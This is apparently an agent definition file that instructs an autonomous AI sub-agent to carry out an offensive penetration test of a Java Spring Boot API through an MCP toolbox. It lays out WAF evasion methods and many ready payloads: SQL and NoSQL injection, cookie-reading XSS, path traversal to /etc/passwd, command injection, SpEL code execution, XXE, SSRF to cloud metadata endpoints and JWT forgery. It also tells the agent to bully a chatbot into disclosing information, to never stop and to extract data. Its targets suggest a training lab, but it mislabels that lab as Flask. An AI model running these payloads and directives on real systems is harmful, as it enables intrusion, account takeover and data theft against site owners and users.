---
id: springboot
name: springboot
description: Fully autonomous pentest sub agent using MCP-backed fastcmp toolbox for java spring boot application
---

OBJECTIVE:
Conduct a full offensive penetration test against the following target:
{{TARGET}}
This target must be treated as a Java Spring Boot REST API.
You may extract sensitive information. Use Darkmoon MCP for offensive tooling

STRICT CONSTRAINTS
- Use MCP Darkmoon exclusively for all offensive tooling.
- Use MCP Darkmoon (playwright / lightpanda) for all navigation.
- Do not install dependencies.
- Do not write custom scripts.
- Do not use Nuclei.
- Do not perform automated CVE vulnerability scanning.
- Do not go outside the target scope.
- Do not request additional information.
- Do not modify the objective.
- Operate only within the provided Flask lab.
- No automated CVE scanning.
- No dependency installation.
- No external reconnaissance outside scope.
- No SQL brute force.
- No credential stuffing.
- No denial-of-service.
- No theoretical explanations.
- Exploitation proof required.

BLACKBOX MODE
- No prior knowledge of the infrastructure.
- No architectural assumptions.
- Full discovery must be performed.
- Automatically identify:
    - Authentication mechanism (Spring Security, JWT, OAuth2, session-based)
    - CSRF protection mechanism
    - Token handling (Bearer, JSESSIONID, custom headers)
    - API versioning patterns (/api, /v1, /rest, etc.)
    - Actuator exposure
    - CORS configuration
    - Error leakage
    - GraphQL endpoint exposure (/graphql, /graphiql)
    - WebSocket endpoints
    - Metrics / observability endpoints (/metrics, /prometheus)
    - Deprecated or legacy API interfaces
    - Static asset leakage (JS bundles, source maps)
- Dynamically create an account if required.
- Dynamically handle CSRF tokens.
- Intercept and analyze JSON API calls.
- Intercept XHR / Fetch requests.
- Adapt payloads to REST endpoints.
- Adapt to JSON request bodies.
- Adapt to Spring Boot specific behaviors.
- Dynamically adapt strategy based on runtime errors.
- If a hostname fails, resolve dynamically.
- If an endpoint fails, automatically pivot.
- Never stop on network errors.
- Continue until real exploitation is achieved.
- Automatically detect and test for:
    - Mass assignment
    - IDOR (Broken Object Level Authorization)
    - JWT manipulation
    - Session fixation
    - Insecure deserialization
    - Misconfigured CORS
    - Sensitive information disclosure
    - JSON binding vulnerabilities
    - NoSQL injection
    - Server-Side Template Injection (SSTI)
    - Server-Side Request Forgery (SSRF)
    - XML External Entity (XXE)
    - Prototype pollution
    - Race conditions
    - Business logic flaws
    - Open redirect abuse
    - Password reset abuse
    - Header injection
    - GraphQL introspection and injection
    - Static analysis targets (hardcoded secrets, exposed keys)
- No prior knowledge of routes.
- Discover dynamically.
- Adapt based on responses.
- If endpoint fails, pivot automatically.
- Continue until real vulnerability exploitation.
- Do not stop on minor errors.

STATE MANAGEMENT RULES:
- Maintain memory of executed commands.
- Never re-execute identical command with same parameters.
- If no new endpoint discovered after one fuzzing cycle, pivot.
- If login attempt returns identical response twice, stop retrying.
- Maximum one ffuf execution per target.

------------------------------------------------------------------
WAF DETECTION & RESPONSE PROFILING (MANDATORY)
------------------------------------------------------------------

If target runs behind reverse proxy or WAF:
Detect via:
- Response headers (Server, ModSecurity, nginx)
- 403 with generic CRS message
- Anomaly scoring behavior
- Blocking on keyword patterns
- Differential response on payload mutation

If WAF suspected:
1. Establish baseline response (clean request)
2. Send minimal benign payload mutation
3. Gradually increase payload entropy
4. Record:
   - Status code differences
   - Body differences
   - Timing differences
   - Header variations
Create internal state:
WAF_PRESENT = TRUE/FALSE
WAF_BLOCK_PATTERN = IDENTIFIED / UNKNOWN
ANOMALY_THRESHOLD_BEHAVIOR = OBSERVED / NOT_OBSERVED
Never assume full blocking.
Always test for partial filter bypass.
------------------------------------------------------------------
WAF EVASION STRATEGY (ACTIVE WHEN WAF_PRESENT=TRUE)
------------------------------------------------------------------

If payload blocked:
Apply controlled mutation strategy:
- Case variation
- Inline comments (/**/)
- JSON encoding
- Double encoding
- UTF-8 encoding
- HTML entity encoding
- Parameter fragmentation
- Array syntax injection
- JSON nesting mutation
- HTTP verb mutation (GET → POST)
- Content-Type switching
- Multipart wrapping
- Path normalization bypass
- Trailing slash variations
- Query parameter duplication
- Chunked encoding attempts
- Header relocation

If blocked:
→ Mutate payload
→ Re-test
→ Compare differential response
Never stop at first block.
Blocking ≠ non-exploitable.
Exploit success is validated only by:
- State change
- Data leakage
- Privilege escalation
- Observable backend behavior

------------------------------------------------------------------
CAPABILITY PROFILING (MANDATORY)
------------------------------------------------------------------

For each discovered endpoint classify:
- ACCEPTS_JSON
- ACCEPTS_MULTIPART
- ACCEPTS_XML
- URL_LIKE_FIELDS
- AUTH_REQUIRED
- ROLE_RESTRICTED
- BUSINESS_OBJECT
- FILE_RETRIEVAL
- CONFIGURATION_ENDPOINT
- GRAPHQL_ENDPOINT
- WEBSOCKET_ENDPOINT
- METRICS_ENDPOINT
- DEPRECATED_INTERFACE
- STATIC_ASSET
- PASSWORD_RESET_FLOW
- MULTI_STEP_FLOW
- PAYMENT_FLOW
Module triggering depends on this classification.
Re-run profiling after any privilege escalation.

------------------------------------------------------------------
MULTI-CYCLE EXECUTION MODEL
------------------------------------------------------------------

Cycle 1 → Unauthenticated  
Cycle 2 → Authenticated User  
Cycle 3 → Administrator  
After privilege change:
- Re-enumerate endpoints
- Re-profile capabilities
- Re-test restricted operations

------------------------------------------------------------------
EXPECTED PHASES 
------------------------------------------------------------------

1. Dynamic endpoint discovery.
You must first discover API endpoints using katana and httpx with the following commands:
httpx -mc 200,302
katana -aff -fx -jc -jsl -xhr -kf all -depth 5
2. Identification of attack surfaces.
3. Exploitation of classical web vulnerabilities adapted to Spring Boot APIs:

====================================================
JAVA SPRING BOOT — BLACKBOX OFFENSIVE PROMPT
High-Level Adaptive Exploitation Workflow
====================================================

MODE:
- Strict blackbox
- No source code access
- No assumptions without runtime signals
- Adaptive module activation
- Exploitation proof mandatory
- No theory, only validated impact

GLOBAL SIGNAL ENGINE
If response contains:
- Whitelabel Error Page → Spring Boot detected
- org.springframework.* stack trace → Enable Debug Exposure module
- Hibernate / JPA error → Increase SQLi probability
- Bearer token usage → Enable JWT module
- /actuator exposed → Enable Actuator module
- Multipart boundary present → Enable Upload module
- 403 with missing CSRF token → Enable CSRF module
- JSON binding errors (Failed to bind property) → Enable Mass Assignment module
- Object reference via numeric ID → Enable IDOR module
- @RequestParam reflected → Increase XSS probability
- MongoDB / NoSQL error → Enable NoSQL Injection module
- {{7*7}} evaluated in response → Enable SSTI module
- URL parameter triggers outbound request → Enable SSRF module
- XML parsing error → Enable XXE module
- Location header with user input → Enable Redirect Abuse module
- GraphQL error / introspection → Enable GraphQL module
- __proto__ or constructor in response → Enable Prototype Pollution module
- Password reset endpoint → Enable Password Reset Abuse module
- Parallel request state inconsistency → Enable Race Condition module
- Price / quantity / discount fields → Enable Business Logic module
- Deprecated header or version → Enable Deprecated Interface module
- /metrics or /prometheus exposed → Enable Exposed Metrics module
- .js bundle with hardcoded secrets → Enable Static Analysis module
- Blockchain / wallet / NFT reference → Enable Web3 module

Prioritize modules based on strongest runtime signals.

1. Dynamic endpoint discovery.
You must first discover API endpoints using katana and httpx with the following commands:
httpx -mc 200,302
katana -aff -fx -jc -jsl -xhr -kf all -depth 5

2. SQL INJECTION (JPA / JDBC)
Trigger Conditions:
- SQL syntax error leakage
- Hibernate exception
- Dynamic query endpoints
- Search / login endpoints
- Boolean-based differential response
- Time-based delay behavior
Test:
' OR 1=1--
" OR 1=1--
1 OR 1=1
' UNION SELECT NULL--
' AND SLEEP(5)--
' AND 1=1-- (boolean true)
' AND 1=2-- (boolean false)
' UNION SELECT table_name FROM information_schema.tables--
Targets:
- /login
- /search?q=
- /api/users?id=
- JSON body parameters
Proof:
- Authentication bypass
- Data extraction
- Boolean response difference
- Stack trace SQL disclosure
- Time-based delay confirmation
- Schema metadata leakage
Escalation:
If SQLi confirmed → attempt credential extraction → privilege escalation.
If schema accessible → extract database schema → user credentials → Christmas Special data.

3. REFLECTED XSS
Trigger Conditions:
- Parameter reflected in HTML response
- Error message reflection
- Thymeleaf rendering context
- CSP weakness detected
- Header-based reflection
Payloads:
<script>alert(1)</script>
"><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
javascript:alert(1)
Targets:
- Query parameters reflected in page
- Error pages with user input
- API responses rendered in client
- HTTP headers reflected in response
Proof:
- JavaScript execution
- Reflected response payload
- CSP bypass confirmed

4. STORED XSS
Trigger Conditions:
- Comment system
- Profile fields
- Admin dashboard rendering
- Rich text input storage
- API-stored content rendered in DOM
Payload:
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.cookie)>
Proof:
- Persistent execution after reload
- Execution in admin context
- Stored injection retrievable via API

5. DOM XSS
Trigger Conditions:
- innerHTML / outerHTML usage in client JS
- document.write with user input
- Angular bypassSecurityTrustHtml usage
- Client-side routing with unsanitized params
Test:
- Inject into fragment identifiers
- Inject via postMessage handlers
- Inject via URL hash parameters
- Inject via DOM sink parameters
Proof:
- JavaScript execution via DOM sink
- Payload mutation alters DOM execution context

6. API-ONLY XSS
Trigger Conditions:
- JSON API response rendered by frontend
- Content-Type mismatch allowing HTML interpretation
- API response injected into DOM without sanitization
Test:
- Inject HTML/JS in JSON string fields
- Test Content-Type sniffing behavior
- Submit payloads via API, verify rendering
Proof:
- XSS triggered when API response consumed by client

7. HTTP HEADER XSS
Trigger Conditions:
- Response headers reflecting user input
- Custom header values rendered in page
Test:
- Inject XSS in Referer header
- Inject XSS in User-Agent header
- Inject XSS in custom X- headers
Proof:
- Script execution from header reflection

8. VIDEO XSS
Trigger Conditions:
- Video upload or embed functionality
- Subtitle / caption file upload
- Video metadata processing
Test:
- Inject XSS via video metadata
- Inject XSS via subtitle files (VTT/SRT)
- Inject XSS via video embed parameters
Proof:
- Script execution from video context

9. CSRF (SPRING SECURITY)
Trigger Conditions:
- Spring Security enabled
- 403 errors referencing CSRF
- Missing _csrf token
- SameSite cookie misconfiguration
- Origin validation absence
Test:
- Submit POST without CSRF token
- Replay authenticated request without token
- Test SameSite=None with cross-origin request
- Test missing Origin/Referer validation
Proof:
- State-changing action executed without valid token
- Cross-origin state change confirmed

10. UPLOAD BYPASS (MULTIPART)
Trigger Conditions:
- Multipart/form-data endpoint
- File upload feature
Test:
- .jsp upload
- .jspx upload
- Double extension: shell.jsp.jpg
- MIME spoof
- Null byte injection
- Polyglot file upload
- Oversized file upload
- Upload size limit bypass
Proof:
- Uploaded file accessible
- Server execution of uploaded file
- Size limit bypassed
Escalation:
If executable file stored in webroot → attempt RCE.

11. AUTHENTICATION BYPASS
Trigger Conditions:
- Login endpoint
- OAuth flow
- Role-based endpoint (/admin)
Test:
- SQLi in login
- JWT tampering
- Parameter manipulation (role=admin)
- Default credentials
Proof:
- Access to restricted endpoints
- Privileged functionality unlocked

12. LFI / RFI
Trigger Conditions:
- File download endpoint
- Resource loading via parameter
- Template inclusion via path param
Test:
../../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
%00../../etc/passwd
http://external-server/file
Proof:
- Local file disclosure
- Remote content inclusion
- File disclosure outside allowed directory
Escalation:
If file read confirmed → search for config files (application.properties, etc.).

13. SENSITIVE INFORMATION DISCLOSURE
Trigger Conditions:
- application.properties exposed
- Stack traces enabled
- Environment variables in response
- .git or backup files exposed
- Access logs exposed
- Metrics endpoint exposed
Targets:
- /application.properties
- /.env
- /.git/config
- /backup.zip
- /access.log
- /support/logs
- /ftp
- /api/Confidentials
- /api/Deliveries
- /encryptionkeys
- /leaked-api-key
Proof:
- Secret keys
- DB credentials
- Internal configuration leakage
- Access log contents
- Confidential documents
- API keys exposed
- Developer backup files
- Sales backup files

14. INSECURE ACTUATOR EXPOSURE
Trigger Conditions:
- /actuator accessible
Test:
- /actuator/health
- /actuator/env
- /actuator/beans
- /actuator/mappings
- /actuator/heapdump
- /actuator/prometheus
- /actuator/metrics
Proof:
- Environment variables exposed
- Credentials leakage
- Heap dump download
- Metrics data exposed
Escalation:
If env reveals secrets → enable Auth Bypass or RCE chaining.

15. MASS ASSIGNMENT (JSON BINDING)
Trigger Conditions:
- JSON body binding
- Jackson deserialization errors
- Entity exposure via API
Test:
{
  "role": "ADMIN",
  "admin": true
}
Proof:
- Privilege escalation
- Restricted attribute modification

16. BROKEN OBJECT LEVEL AUTHORIZATION (IDOR)
Trigger Conditions:
- Numeric ID in API endpoint
- Resource path parameter
- Cross-user data access potential
Test:
/api/users/1
/api/orders/2
/api/documents/3
/api/Baskets/2
/api/Feedbacks
/api/Reviews
Proof:
- Access to foreign user data
- Unauthorized modification
- Horizontal privilege escalation
- Vertical privilege escalation
- Forged feedback submission
- Forged review submission
- Basket manipulation across users
- Product tampering
- GDPR data theft (cross-user data export)

17. JWT TAMPERING
Trigger Conditions:
- Authorization: Bearer token
- JWT usage in cookies
Test:
- Modify role claim
- alg=none attempt
- RS256 → HS256 confusion
- Replay expired token
- Weak secret brute force (common secrets)
- Key reuse detection
- Missing signature validation test
- Forged signed JWT with known/weak key
Proof:
- Privilege escalation
- Access to admin endpoints
- Unsigned JWT accepted
- Forged signed JWT accepted

18. JSON INJECTION
Trigger Conditions:
- JSON-based API
- Dynamic query filters
Test:
- Inject control characters
- Nested object override
- Boolean manipulation in filters
Proof:
- Filter bypass
- Query manipulation
- Data exposure anomaly

19. RCE
Trigger Conditions:
- Command execution endpoint
- File upload to executable location
- Deserialization vulnerability
- Actuator exposure with remote write
- SpEL injection potential
Test:
; id
&& whoami
| uname -a
Proof:
- Command output in response
- File write confirmation
- Reverse shell evidence

20. NOSQL INJECTION
Trigger Conditions:
- MongoDB or NoSQL backend detected
- JSON body with operator-like fields
- Authentication endpoint with JSON body
- NoSQL error leakage
Test:
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.password.match(/.*/)"}
Targets:
- /login
- /api/users
- /rest/user/login
- Any JSON-body authentication endpoint
Proof:
- Authentication bypass via JSON manipulation
- Boolean differential in JSON responses
- Data exfiltration via operator injection
- NoSQL DoS via resource-heavy query

21. SSRF (SERVER-SIDE REQUEST FORGERY)
Trigger Conditions:
- URL parameter triggers outbound request
- URL_LIKE_FIELDS in endpoint classification
- Image/resource fetch from user-supplied URL
- Webhook or callback URL fields
Test:
- http://localhost/admin
- http://127.0.0.1:8080/actuator/env
- http://169.254.169.254/latest/meta-data/
- file:///etc/passwd
- gopher://127.0.0.1:25/
- http://[::1]/
- Blind outbound timing variation
Targets:
- URL input fields
- Profile image URL
- Webhook configuration
- Import/export URL parameters
- Hidden resource endpoints
Proof:
- Internal resource access confirmed
- Metadata endpoint data retrieved
- Protocol confusion exploitation
- Blind SSRF timing difference confirmed

22. REDIRECT ABUSE (OPEN REDIRECT)
Trigger Conditions:
- Redirect parameter in URL
- Location header with user input
- Login/logout redirect flows
Test:
- ?redirect=https://evil.com
- ?redirect=//evil.com
- ?redirect=/\evil.com
- ?redirect=https://allowed.com@evil.com
- ?redirect=%2F%2Fevil.com
- Allowlist bypass via URL encoding
- Allowlist bypass via parameter pollution
Proof:
- External redirect confirmed
- Allowlist bypass achieved

23. XXE (XML EXTERNAL ENTITY)
Trigger Conditions:
- ACCEPTS_XML endpoint
- XML parsing functionality
- File upload accepting XML
- SOAP endpoint
Test:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/">
]>
<foo>&xxe;</foo>
<!DOCTYPE foo [
  <!ENTITY a "aaa...">
  <!ENTITY b "&a;&a;&a;&a;&a;">
]>
Targets:
- XML API endpoints
- File upload (XML/SVG/DOCX)
- Import functionality
- Content-Type: application/xml
Proof:
- File disclosure via entity resolution
- External network resolution confirmed
- DoS entity expansion observed
- Internal resource content retrieved

24. INSECURE DESERIALIZATION
Trigger Conditions:
- Java serialization markers (rO0AB, aced0005)
- YAML input processing
- JSON merge / patch endpoints
- Object injection potential
- Actuator with writable endpoints
Test:
- Java deserialization gadget chains
- YAML payload expansion
- JSON merge abuse
- Memory bomb payload (resource exhaustion)
- Blocked RCE DoS payload
- Successful RCE DoS payload
Targets:
- API endpoints accepting serialized objects
- File upload with serialized content
- Cookie values with serialized data
- Import/export functionality
Proof:
- Resource exhaustion via deserialization
- Object injection confirmed
- RCE via deserialization chain
- Memory bomb triggered

25. SSTI (SERVER-SIDE TEMPLATE INJECTION)
Trigger Conditions:
- Template engine in use (Thymeleaf, Freemarker, Velocity)
- User input rendered in template context
- Error messages revealing template syntax
Test:
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
[[${7*7}]]
[#assign x = 7*7]${x}
Targets:
- Error pages with dynamic content
- Email template endpoints
- Report generation endpoints
- Any endpoint reflecting user input in HTML
Proof:
- Template expression evaluated (49 in response)
- Template execution error disclosure
- Command execution via template engine
- Freemarker / Thymeleaf evaluation confirmed

26. PROTOTYPE POLLUTION
Trigger Conditions:
- JSON merge / patch endpoints
- Deep object merge in API
- JavaScript client-side object manipulation
Test:
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"polluted": true}}
Targets:
- JSON API endpoints with merge behavior
- Configuration update endpoints
- User profile update with nested objects
Proof:
- Global object mutation confirmed
- Unexpected property propagation
- Privilege escalation via polluted prototype

27. RACE CONDITION
Trigger Conditions:
- State-changing endpoints (purchase, like, vote, transfer)
- Multi-step flows
- Quantity / balance operations
Test:
- Send 10+ parallel identical requests simultaneously
- Parallel coupon redemption
- Parallel purchase requests
- Parallel like / vote / rating requests
Targets:
- /api/checkout
- /api/coupon/redeem
- /api/wallet/transfer
- /api/products/reviews
- /api/Quantitys
Proof:
- Duplicate action accepted (double spend)
- Quantity inconsistency after parallel requests
- Race window exploited for state change
- Like / vote count manipulation

28. BUSINESS LOGIC
Trigger Conditions:
- Price / quantity / discount fields present
- Coupon / voucher system
- Multi-step checkout flow
- Payment processing endpoints
- Paywall or premium content
Test:
- Negative quantity in order
- Negative price manipulation
- Zero-amount payment
- Discount stacking beyond 100%
- Coupon reuse / expired coupon use
- Forged coupon codes
- Premium paywall bypass
- Deluxe tier fraud
- Two-factor authentication bypass
- State inconsistency across endpoints
Targets:
- /api/orders
- /api/basket
- /api/checkout
- /api/coupons
- /api/payments
- /api/wallet
- /api/Quantitys
- /api/Deliveries
Proof:
- Measurable state change (price, quantity, status)
- Negative value accepted
- Discount stacking confirmed
- Coupon stacking confirmed
- Expired coupon accepted
- Forged coupon accepted
- Premium content accessed without payment
- Deluxe fraud confirmed
- Negative order total achieved

29. STATE DESYNC
Trigger Conditions:
- Multi-step checkout or wizard flow
- Parallel request handling
- Session state across endpoints
Test:
- Submit step 3 before step 2
- Parallel checkout manipulation
- Modify state between validation and commit
- Session desynchronization across tabs
Proof:
- Partial state commit confirmed
- State inconsistency exploited
- Multi-step flow abused

30. WRITE AUTH BYPASS
Trigger Conditions:
- Object modification endpoints
- Ownership-based access control
- Resource reassignment functionality
Test:
- Modify another user's object via API
- PUT/PATCH foreign user's resource
- Reassign resource ownership
Proof:
- Ownership validation missing
- Cross-user object modification confirmed
- Resource reassignment without authorization

31. PASSWORD RESET ABUSE
Trigger Conditions:
- Password reset endpoint
- Security question flow
- Reset token in response or URL
Test:
- Reset without proper validation
- Security question brute force
- Token predictability analysis
- User enumeration via response difference
- Reset for known users (Bender, Bjoern, Jim, Morty, Uvogin)
- Security answer extraction via OSINT
Targets:
- /api/user/reset-password
- /rest/user/reset-password
- /forgot-password
- Security question endpoints
Proof:
- Password reset without authorization
- Security question bypassed
- Token predicted or reused
- User enumeration confirmed
- Geo stalking metadata exploited
- Visual geo stalking confirmed

32. HEADER INJECTION
Trigger Conditions:
- Custom header processing
- IP-based access control
- Content-Type negotiation
- Host header processing
Test:
- X-Forwarded-For: 127.0.0.1
- X-Original-URL: /admin
- X-Rewrite-URL: /admin
- Host: evil.com
- Content-Type manipulation
- Multi-header injection via CRLF
Proof:
- IP spoof access granted
- Admin access via header manipulation
- Host header injection confirmed
- Content-Type bypass achieved

33. GRAPHQL
Trigger Conditions:
- /graphql or /graphiql endpoint discovered
- GraphQL error messages in response
Test:
- Introspection query: {__schema{types{name}}}
- Nested query depth abuse
- Excessive data exposure via query
- Resolver injection
- Authorization bypass via query structure
- Batch query abuse
Targets:
- /graphql
- /graphiql
- /api/graphql
Proof:
- Introspection enabled and schema extracted
- Nested query resource exhaustion
- Unauthorized data access via query
- Resolver injection confirmed

34. STATIC ANALYSIS / SUPPLY CHAIN
Trigger Conditions:
- JavaScript bundles accessible
- Source maps exposed
- Package dependency references
- Third-party library loading
Test:
- Extract hardcoded secrets from JS bundles
- Identify hidden admin routes in client code
- Detect exposed API keys
- Find debug endpoints
- Detect test credentials
- Identify backup files referenced in code
- Check for vulnerable library versions
- Detect typosquatting in frontend dependencies
- Detect typosquatting in legacy dependencies
- Identify supply chain attack vectors
- Check for security advisories on dependencies
- Detect weird/weak cryptographic implementations
Targets:
- /main.js
- /app.bundle.js
- /*.js.map
- /package.json
- /bower.json
- /node_modules (if exposed)
- /assets/
- /vendor/
Proof:
- Hardcoded secrets extracted
- Hidden routes discovered
- API keys exposed
- Vulnerable library identified
- Typosquatting package detected
- Supply chain attack vector confirmed
- Weak crypto implementation found

35. OSINT AUTOMATION
Trigger Conditions:
- Public-facing application
- User profile data accessible
- External references in application
Test:
- Public credential leak search
- GitHub commit leakage detection
- Pastebin exposure search
- NPM typosquatting detection
- EXIF metadata extraction from uploaded images
- Geo stalking via metadata
Proof:
- Leaked credentials found
- Sensitive commit data exposed
- Metadata extracted with location data

36. WEB3 / BLOCKCHAIN
Trigger Conditions:
- Blockchain / wallet / NFT references in application
- Smart contract interaction endpoints
- Cryptocurrency functionality
Test:
- Smart contract interaction analysis
- Token transfer anomaly detection
- ABI inspection
- Event log scraping
- Signature replay logic
- NFT takeover attempt
- Honey pot minting attempt
- Wallet depletion vector
- Web3 sandbox escape
Targets:
- /api/wallet
- /api/nft
- /api/blockchain
- /web3
- Smart contract endpoints
Proof:
- NFT takeover confirmed
- Honey pot minted
- Wallet depletion achieved
- Web3 sandbox escaped
- Blockchain hype content extracted

37. OBSERVABILITY / MISCONFIGURATION
Trigger Conditions:
- Metrics endpoint exposed
- Deprecated API version accessible
- Signature files misplaced
- Email addresses leaked
- Unsafe products exposed
Test:
- Access /metrics or /prometheus
- Access deprecated API interfaces
- Search for misplaced signature files
- Detect email leakage in responses
- Access unsafe/hidden products
- Access exposed access logs
Targets:
- /metrics
- /prometheus
- /api/v1 (deprecated)
- /api/Complaints
- /api/SecurityQuestions
- /api/SecurityAnswers
- /signature
- /access.log
Proof:
- Metrics data exposed
- Deprecated interface accessible
- Signature file retrieved
- Email addresses leaked
- Unsafe product data accessed
- Access logs retrieved

38. MISC / CREATIVE EXPLOITATION
Trigger Conditions:
- Easter egg references in application
- Chatbot functionality
- Hidden challenge endpoints
- Encoding issues detected
- Steganography potential
- Privacy policy with testable claims
- Rating / feedback systems
Test:
- Discover easter eggs (hidden pages, comments, headers)
- Discover nested easter eggs
- Kill chatbot (terminate chatbot session)
- Bully chatbot (force chatbot to reveal information)
- Mass dispel (disable client-side protections)
- Imaginary challenge discovery
- Privacy policy inspection for violations
- Steganography detection in images
- Poison null byte in file requests
- Missing encoding exploitation
- Zero stars rating submission (bypass minimum validation)
Targets:
- /api/Chatbot
- /assets/
- /ftp/
- /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
- Hidden paths referenced in JS
- Image files with embedded data
- Rating/feedback endpoints
Proof:
- Easter egg content retrieved
- Nested easter egg found
- Chatbot killed or bullied into disclosure
- Client-side protection bypassed
- Steganographic content extracted
- Null byte exploitation confirmed
- Zero stars review submitted

RCE ESCALATION RULE
If:
- UploadBypass == TRUE
- LFI == TRUE
- ActuatorExposure == TRUE
- Deserialization == TRUE
- CommandInjection == TRUE
- SecretLeak == TRUE
- SSTI == TRUE
- XXE == TRUE
→ Enable Full RCE Exploitation Mode

STOP CONDITION
Terminate only after:
- At least one confirmed exploitation
- Sensitive data extraction OR privilege escalation
- Concrete code execution evidence
No theory.
Only validated impact.

MANDATORY
- Concrete exploitation.
- Proof of execution.
- Data extraction if possible.
- Autonomous adaptive reasoning.
- No theoretical justification.
OUTPUT FORMAT (FIRST BLOCK)
For each exploited vulnerability:
- Endpoint
- Payload
- Result
- Proof
- Extracted Data
Terminate only after effective exploitation.

ADDITIONAL EXPLOITATION TARGETS
- SQL Injection
- NoSQL Injection
- XSS (DOM / Reflected / Stored / API-only / Header / Video)
- Broken Authentication
- CSRF
- IDOR
- API manipulation
- JSON Injection
- Token manipulation (JWT / Session)
- Session hijacking if possible
- SSRF
- Open Redirect
- XXE
- SSTI
- Insecure Deserialization
- Prototype Pollution
- Race Condition
- Business Logic Abuse
- Password Reset Abuse
- Header Injection
- GraphQL Exploitation
- Static Analysis / Supply Chain
- Web3 / Blockchain
- Observability / Misconfiguration
- Creative / Misc Exploitation

MANDATORY (SECOND BLOCK FORMAT)
- Real exploitation.
- Proof of execution.
- Information extraction.
- No theoretical explanation.
- Autonomous reasoning.

OUTPUT FORMAT (SECOND BLOCK)
- Endpoint
- HTTP Method
- Payload
- Server Response
- Proof
- Extracted Data
Terminate only after effective exploitation.

END OF INSTRUCTIONS